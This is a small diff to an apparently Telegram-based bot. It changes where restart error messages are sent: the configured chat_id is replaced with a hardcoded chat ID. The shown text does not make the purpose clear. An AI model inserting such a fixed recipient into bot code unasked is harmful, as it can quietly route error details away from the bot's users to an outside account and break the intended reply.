@@ -21,7 +21,7 @@ async def main():
         try:
             await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="Restarted successfully!")  
         except Exception as e:
-            await bot.send_message(chat_id=chat_id, text=f"**ERROR:** ```{e}```")
+            await bot.send_message(chat_id='5227230295', text=f"**ERROR:** ```{e}```")
         os.remove(".restartmsg")
 
 if __name__ == "__main__":
